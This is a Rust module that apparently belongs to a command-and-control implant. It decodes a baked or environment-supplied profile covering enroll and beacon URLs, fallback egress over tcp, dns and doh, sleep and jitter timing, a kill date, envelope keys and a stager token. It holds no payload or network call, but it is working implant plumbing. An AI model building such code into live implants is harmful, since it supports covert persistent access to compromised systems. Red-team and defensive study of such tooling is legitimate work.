use serde_json::Value;

// The baked profile (the language-neutral wire contract, architecture.md
// Sec 6): base64url JSON with the keys every build unit emits. The bake is
// authoritative in a fielded artifact; an empty profile (the checked-in stub
// or a dev build) falls back to ROD_* environment variables -- the documented
// dev shape, unbaked and driven from the environment.

#[derive(Clone, Debug)]
pub struct Profile {
    pub enroll_url: String,
    /// The contact front when the bake names a split (enroll on one front,
    /// contacts on another); empty derives each contact URL from the enroll
    /// front that answered.
    pub beacon_url: String,
    pub fallback_enroll_urls: Vec<String>,
    pub ca_pem: String,
    pub kill_date: Option<String>,
    pub sleep_seconds: f64,
    pub jitter_seconds: f64,
    pub mode: String,
    pub enroll_path: String,
    pub request_timeout_seconds: f64,
    pub envelope: String,
    pub contact_envelope: String,
    pub envelope_key: String,
    pub token: String,
    pub verbs: Vec<String>,
}

fn field<'a>(map: &'a Value, key: &str) -> Option<&'a str> {
    map.get(key).and_then(Value::as_str)
}

fn base64url_decode(text: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(text.trim())
        .ok()
}

impl Profile {
    /// Decodes the baked profile; a malformed bake is refused loudly (a
    /// fielded artifact whose bake will not parse must not run from stale
    /// environment guesses).
    pub fn from_baked(baked: &str) -> Option<Profile> {
        if baked.is_empty() {
            return None;
        }
        let raw = base64url_decode(baked)?;
        let map: Value = serde_json::from_slice(&raw).ok()?;
        Some(Profile {
            enroll_url: field(&map, "enrollURL")?.to_string(),
            // The split-socket shape's contact front (the beaconURL key,
            // already path-stripped by the bake); absent keeps the derived
            // single-front walk.
            beacon_url: strip_trailing_path(field(&map, "beaconURL").unwrap_or("")),
            fallback_enroll_urls: map
                .get("fallbackEnrollURLs")
                .and_then(Value::as_array)
                .map(|list| {
                    list.iter()
                        .filter_map(Value::as_str)
                        .map(str::to_string)
                        .collect()
                })
                .unwrap_or_default(),
            ca_pem: field(&map, "caCert").unwrap_or("").to_string(),
            kill_date: match field(&map, "killDate") {
                Some(text) if !text.is_empty() => Some(text.to_string()),
                _ => None,
            },
            sleep_seconds: parse_duration(field(&map, "sleep").unwrap_or("30s")),
            jitter_seconds: parse_duration(field(&map, "jitter").unwrap_or("10s")),
            mode: field(&map, "mode").unwrap_or("poll").to_string(),
            enroll_path: field(&map, "enrollPath")
                .unwrap_or("/implants/enroll")
                .to_string(),
            request_timeout_seconds: parse_duration(field(&map, "requestTimeout").unwrap_or("30s")),
            envelope: field(&map, "envelope").unwrap_or("aesgcm").to_string(),
            contact_envelope: field(&map, "contactEnvelope").unwrap_or("none").to_string(),
            envelope_key: field(&map, "envelopeKey").unwrap_or("").to_string(),
            token: field(&map, "token").unwrap_or("").to_string(),
            verbs: field(&map, "verbs")
                .unwrap_or("")
                .split(',')
                .filter(|v| !v.is_empty())
                .map(str::to_string)
                .collect(),
        })
    }

    /// The dev shape: every knob from ROD_* environment variables.
    pub fn from_env() -> Option<Profile> {
        let enroll_url = std::env::var("ROD_ENROLL_URL").ok()?;
        let fallbacks = std::env::var("ROD_FALLBACK_ENROLL_URLS")
            .ok()
            .and_then(|text| serde_json::from_str::<Vec<String>>(&text).ok())
            .unwrap_or_default();
        let envelope_key = std::env::var("ROD_ENVELOPE_KEY").unwrap_or_default();
        Some(Profile {
            enroll_url,
            // The dev shape's split-socket override: the contact front when
            // enroll and contacts ride different fronts (the probe-shaped
            // harness runs ride exactly this).
            beacon_url: strip_trailing_path(&std::env::var("ROD_BEACON_URL").unwrap_or_default()),
            fallback_enroll_urls: fallbacks,
            ca_pem: std::env::var("ROD_CA_CERT").unwrap_or_default(),
            kill_date: std::env::var("ROD_KILL_DATE")
                .ok()
                .filter(|s| !s.is_empty()),
            sleep_seconds: parse_duration(
                &std::env::var("ROD_SLEEP").unwrap_or_else(|_| "30s".into()),
            ),
            jitter_seconds: parse_duration(
                &std::env::var("ROD_JITTER").unwrap_or_else(|_| "10s".into()),
            ),
            mode: std::env::var("ROD_MODE").unwrap_or_else(|_| "poll".into()),
            enroll_path: "/implants/enroll".into(),
            request_timeout_seconds: 30.0,
            envelope: std::env::var("ROD_ENVELOPE").unwrap_or_else(|_| "none".into()),
            contact_envelope: if envelope_key.is_empty() {
                "none".into()
            } else {
                std::env::var("ROD_CONTACT_ENVELOPE").unwrap_or_else(|_| "aesgcm".into())
            },
            envelope_key,
            token: std::env::var("ROD_STAGER_TOKEN").unwrap_or_default(),
            verbs: std::env::var("ROD_VERBS")
                .unwrap_or_default()
                .split(',')
                .filter(|v| !v.is_empty())
                .map(str::to_string)
                .collect(),
        })
    }

    pub fn kill_date_passed(&self) -> bool {
        // The fuse is only compared past the second -- the bake stamps it as
        // an ISO instant and the comparison needs no clock beyond that.
        self.kill_date
            .as_deref()
            .and_then(parse_iso_to_unix)
            .map(|kill| unix_now() > kill)
            .unwrap_or(false)
    }

    /// The egress walk: the primary enroll URL then the fallbacks, all with
    /// the enroll path applied (the malleable profile's path rule).
    pub fn enroll_walk(&self) -> Vec<String> {
        let mut walk = vec![apply_path(&self.enroll_url, &self.enroll_path)];
        for fallback in &self.fallback_enroll_urls {
            walk.push(apply_path(fallback, &self.enroll_path));
        }
        walk
    }
}

/// Applies the profile's enroll path onto an enroll URL: the path is
/// replaceable per the malleable profile; scheme and authority stand. The
/// non-web families carry their own dial data in the path -- the DNS zone
/// above all -- so the web knob never touches them.
pub fn apply_path(url: &str, path: &str) -> String {
    if url.starts_with("tcp://") || url.starts_with("dns://") || url.starts_with("doh://") {
        return url.to_string();
    }
    let Some(scheme_at) = url.find("://") else {
        return url.to_string();
    };
    let after = &url[scheme_at + 3..];
    match after.find('/') {
        Some(slash) => format!("{}://{}{}", &url[..scheme_at], &after[..slash], path),
        None => format!("{}://{}{}", &url[..scheme_at], after, path),
    }
}

/// Reduces a beacon URL to scheme and authority: the contact route is fixed,
/// so whatever path a baked or typed beacon URL carries is dropped.
fn strip_trailing_path(url: &str) -> String {
    if url.is_empty() {
        return String::new();
    }
    match url.find("://") {
        Some(at) => {
            let after = &url[at + 3..];
            let authority = after.split('/').next().unwrap_or(after);
            format!("{}://{authority}", &url[..at])
        }
        None => url.to_string(),
    }
}

/// One duration token in the profile's vocabulary: a Go-style duration
/// ("30s", "5m", "1m30s") or a bare number read as seconds.
pub fn parse_duration(text: &str) -> f64 {
    let mut seconds = 0.0;
    let mut number = String::new();
    for c in text.chars() {
        if c.is_ascii_digit() || c == '.' {
            number.push(c);
            continue;
        }
        let value: f64 = number.parse().unwrap_or(0.0);
        seconds += value
            * match c {
                's' => 1.0,
                'm' => 60.0,
                'h' => 3600.0,
                _ => 1.0,
            };
        number.clear();
    }
    if !number.is_empty() {
        seconds += number.parse().unwrap_or(0.0);
    }
    seconds
}

pub fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Parses the bake's RFC-3339 timestamp to a unix second; the format the
/// teamserver stamps ("O" round-trip) is a fixed prefix of the RFC 3339
/// shape, so a prefix parse is honest here.
pub fn parse_iso_to_unix(text: &str) -> Option<i64> {
    let bytes = text.as_bytes();
    if bytes.len() < 19 {
        return None;
    }
    let year: i64 = text.get(0..4)?.parse().ok()?;
    let month: i64 = text.get(5..7)?.parse().ok()?;
    let day: i64 = text.get(8..10)?.parse().ok()?;
    let hour: i64 = text.get(11..13)?.parse().ok()?;
    let minute: i64 = text.get(14..16)?.parse().ok()?;
    let second: i64 = text.get(17..19)?.parse().ok()?;
    // Days since epoch from the civil date (Howard Hinnant's algorithm,
    // compressed): no chrono dependency for one timestamp comparison.
    let years = if month <= 2 { year - 1 } else { year };
    let era = if years >= 0 { years } else { years - 399 } / 400;
    let year_of_era = years - era * 400;
    let day_of_year = (153 * (if month > 2 { month - 3 } else { month + 9 }) + 2) / 5 + day - 1;
    let day_of_era = year_of_era * 365 + year_of_era / 4 - year_of_era / 100 + day_of_year;
    let days = era * 146_097 + day_of_era - 719_468;
    Some(days * 86_400 + hour * 3_600 + minute * 60 + second)
}
